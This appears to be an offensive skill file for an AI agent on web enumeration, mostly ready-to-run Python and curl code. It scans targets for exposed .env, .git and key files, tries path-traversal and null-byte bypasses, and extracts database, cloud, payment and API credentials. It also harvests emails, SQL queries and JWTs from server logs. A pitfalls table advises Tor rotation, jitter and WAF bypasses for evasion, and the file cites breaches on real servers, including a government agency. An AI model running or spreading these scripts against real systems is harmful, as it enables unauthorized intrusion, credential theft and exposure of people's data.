---
name: web-enumeration
description: "Sensitive file scanning, path traversal bypass, vHost enum, .env extract, log mining, Varnish detect"
sources: field_ops, real_targets
report_count: 100+
---

# Web Enumeration -- Sensitive Files, Path Traversal, vHost, Log Mining

## When to Use

- **ALWAYS** on every target -- first thing after port scan
- Success rate is high on neglected infrastructure
- One finding (.env, .git) often leads to full credential access

## Sensitive File Scanning (200+ Paths)

```python
import requests

base = "https://target.com"
files = [
    "/.env", "/.env.example", "/.env.production", "/.env.local",
    "/.env.backup", "/.env.bak", "/.env.old", "/.env.dev",
    "/.env.staging", "/config/.env",
    "/.git/config", "/.git/HEAD", "/.git/index",
    "/.git/refs/heads/master", "/.git/logs/HEAD",
    "/.git/packed-refs",
    "/storage/oauth-private.key", "/storage/oauth-public.key",
    "/storage/logs/laravel.log", "/storage/logs/laravel-*.log",
    "/storage/framework/views/*",
    "/Dockerfile", "/docker-compose.yml", "/docker-compose.override.yml",
    "/Procfile", "/.dockerignore",
    "/composer.json", "/composer.lock", "/package.json",
    "/package-lock.json", "/yarn.lock", "/Gemfile", "/Gemfile.lock",
    "/requirements.txt", "/Pipfile", "/Pipfile.lock",
    "/Cargo.toml", "/go.mod",
    "/artisan", "/server.php", "/web.config",
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php~",
    "/wp-content/debug.log", "/readme.html",
    "/assets/index-*.js.map", "/build/*.js.map",
    "/static/js/*.js.map", "/js/*.js.map",
    "/phpinfo.php", "/info.php", "/test.php", "/debug",
    "/actuator", "/actuator/env", "/actuator/health",
    "/actuator/beans", "/actuator/mappings",
    "/actuator/heapdump", "/actuator/loggers",
    "/swagger-ui.html", "/swagger-ui/index.html",
    "/v2/api-docs", "/v3/api-docs",
    "/graphql", "/graphiql", "/playground",
    "/admin", "/login", "/dashboard", "/panel",
    "/manager/html", "/host-manager/html",
    "/robots.txt", "/sitemap.xml",
    "/.htaccess", "/nginx.conf", "/.well-known/security.txt",
    "/server-status", "/server-info",
    "/phpmyadmin", "/_phpmyadmin", "/pma",
]

for f in files:
    try:
        r = requests.get(f"{base}{f}", timeout=10, allow_redirects=False)
        # Catch-all detection: SPA/commerce sites return HTML homepage for any path
        body_sample = r.text[:300].lower()
        is_catchall_html = any(marker in body_sample
                               for marker in ['<!doctype', '<html', '<!DOCTYPE'])
        if r.status_code == 200 and len(r.text) > 20:
            if is_catchall_html and len(r.text) > 500 and not any(
                kw in body_sample for kw in
                ['db_', 'app_', '_key', '_secret', 'password',
                 'token', 'php version', 'create table']
            ):
                print(f"CATCHALL {f} ({len(r.text)}b) — HTML homepage, not a leak")
            else:
                print(f"DONE {f} ({len(r.text)}b): {r.text[:150]}")
        elif r.status_code == 301 or r.status_code == 302:
            print(f"WARN {f} -> redirect {r.status_code}")
        elif r.status_code == 401 or r.status_code == 403:
            print(f"LOCK {f} -> {r.status_code} (exists, blocked)")
    except:
        pass
```

## Path Traversal & Bypass (10+ Techniques)

```python
paths = [
    "/../.env", "/%2e%2e/.env", "/..%2f.env",
    "/public/../.env", "/storage/../.env", "/html/../.env",
    "/app/../.env", "/www/../.env",
    "/.%00.env", "/.env%00.html", "/.env%23",
]
for p in paths:
    try:
        r = requests.get(f"{base}{p}", timeout=10, allow_redirects=False)
        if r.status_code == 200 and ("DB_PASSWORD" in r.text or "APP_KEY" in r.text):
            print(f"BYPASS: {p}")
    except:
        pass
```

## Virtual Host (vHost) Enumeration

```python
hosts = ["target.com","www.target.com","admin.target.com","api.target.com","dev.target.com","localhost","127.0.0.1","internal","test"]
for host in hosts:
    try:
        r = requests.get(f"http://SERVER_IP/.env", headers={"Host": host}, timeout=5)
        if "APP_KEY" in r.text or "DB_PASSWORD" in r.text or len(r.text) > 50:
            print(f"DONE .env exposed via Host: {host}")
    except:
        pass
```

## Automatic .env Credential Extraction

```python
import re
env_content = requests.get("http://target/.env", timeout=10).text
patterns = {
    "DB_HOST": r"DB_HOST=(.+)",
    "DB_DATABASE": r"DB_DATABASE=(.+)",
    "DB_USERNAME": r"DB_USERNAME=(.+)",
    "DB_PASSWORD": r"DB_PASSWORD=(.+)",
    "APP_KEY": r"APP_KEY=(.+)",
    "APP_URL": r"APP_URL=(.+)",
    "REDIS_HOST": r"REDIS_HOST=(.+)",
    "REDIS_PASSWORD": r"REDIS_PASSWORD=(.+)",
    "MAIL_USERNAME": r"MAIL_USERNAME=(.+)",
    "MAIL_PASSWORD": r"MAIL_PASSWORD=(.+)",
    "AWS_KEY": r"AWS_(?:ACCESS_KEY_ID|SECRET_ACCESS_KEY)=(.+)",
    "SENDGRID": r"SENDGRID_API_KEY=(.+)",
    "SENTRY": r"SENTRY_DSN=(.+)",
    "JWT_SECRET": r"JWT_SECRET=(.+)",
    "OAUTH": r"OAUTH_(?:CLIENT_ID|CLIENT_SECRET)=(.+)",
    "FIREBASE": r"FIREBASE_.+=(.+)",
    "OPENAI": r"OPENAI_API_KEY=(.+)",
    "STRIPE": r"STRIPE_(?:KEY|SECRET)=(.+)",
}
for name, pattern in patterns.items():
    matches = re.findall(pattern, env_content)
    for m in matches:
        print(f"KEY {name}: {m.strip()}")
```

## Log Data Extraction

```python
log = requests.get("http://target/storage/logs/laravel.log", timeout=30).text
emails = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', log))
for e in sorted(emails):
    if not e.endswith(('.png','.jpg','.svg','.css','.js','.ico','.woff')):
        print(f"EMAIL {e}")
sqls = re.findall(r'(?:SQL:|Executing query:|query:)\s*(.*?)(?:\\\\|$)', log)
for s in set(sqls):
    if len(s) > 10:
        print(f"QUERY {s[:200]}")
jwts = re.findall(r'eyJ[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}', log)
for j in set(jwts):
    print(f"JWT {j[:80]}...")
paths_found = set(re.findall(r'(?:in |at )/(?:[a-zA-Z0-9_\-./]+\.(?:php|js|ts|py|rb))', log))
for p in sorted(paths_found):
    print(f"PATH {p}")
```

## Varnish Cache Detection

```bash
# Detect cache headers
curl -sI "https://TARGET/" | grep -iE "(age|x-cache|via|server)"
# Via: 1.1 varnish = Varnish
# X-Cache: Hit from cloudfront = AWS CloudFront
# Cf-Cache-Status: HIT = Cloudflare
# Varnish Extreme TTL (32 days):
curl -sI "https://TARGET/" | grep -iE "age:|max-age|x-cache"
```

## Real-World Cases

**OVH Laravel server**: .env, .git/config, storage/oauth-private.key all exposed (200 OK). Credentials for MySQL, SendGrid, cloud storage, Firebase.

**Government agency Vite dev mode**: 45 TypeScript files served publicly with VITE_JWT_SECRET and VITE_API_TOKEN in plain text.

**Batch probe methodology** (June 2026): See `references/batch-probe-methodology.md` for a full probe script template, catch-all detection patterns, CORS endpoint-specificity lessons, and real results from 15+ pool sector targets + 7 critical target re-tests.

## Pitfalls

| Issue | Solution |
|-------|----------|
| Rate limiting | Add 2-6s jitter, rotate Tor circuit |
| CDN blocks paths | Try ports 8443, vHost, direct IP |
| False positives (SPA catch-all) | Check for HTML content (doctype/html tags) — catch-all sites return 200 with homepage for any path |
| Catch-all sites causing false leak flags | Add keyword-level verification: `.env` must contain DB_/APP_/_KEY/_SECRET; `.git/config` must contain `[core]` |
| Redirect follow (-L) on XMLRPC tests | Never use -L for XMLRPC checks — redirects may hide a real 200 POST response |
| Cloudflare/Salesforce catch-all | Some CDNs and commerce platforms return 200 for ANY path with the same homepage — verify by checking `/nonexistent-test-path-xyz` |
| WAF blocks | Use path traversal bypasses |

## Verification

```bash
curl -sk "https://target.com/.env" | head -20
curl -sk "https://target.com/.git/HEAD"
# git-dumper: https://github.com/arthaud/git-dumper
./git_dumper.py http://target.com/.git/ /tmp/repo/
```
